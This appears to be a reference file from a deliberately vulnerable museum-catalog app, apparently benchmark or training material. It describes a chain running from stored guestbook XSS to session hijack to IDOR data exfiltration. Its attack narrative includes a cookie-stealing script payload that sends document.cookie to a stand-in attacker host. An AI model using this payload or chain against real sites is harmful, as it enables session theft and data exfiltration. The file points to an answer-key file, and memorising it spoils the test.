# Chained Vulnerability Scenarios — Museum Catalog

## Chain: "Stored Guestbook XSS → Session Hijack IDOR Exfiltration"

| Step | Issue | Severity (standalone) | OWASP | Location |
|------|-------|-----------------------|-------|----------|
| 1 | Guestbook comments are vulnerable to Stored XSS | High | A03 | `src/index.js` → `GET /api/guestbook` |
| 2 | Exhibit details are vulnerable to IDOR | Medium | A01 | `src/index.js` → `GET /api/exhibits/:id` |


**Attack narrative**: 1. The attacker submits a guestbook entry containing a malicious script: `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`.
2. The curator admin reviews guestbook submissions at `/api/guestbook`.
3. The script executes in the curator's browser, transmitting their session cookie.
4. The attacker sets the hijacked cookie and queries `/api/exhibits/2`.
5. The server returns the private details of gold pharaonic crowns, achieving data exfiltration.

**Combined Impact**: `db_exfiltration` — Attacker hijacks admin sessions to download private museum records.

---

_This file is for internal reference. Ground truth vulnerability data is maintained in [.vulns](.vulns)._
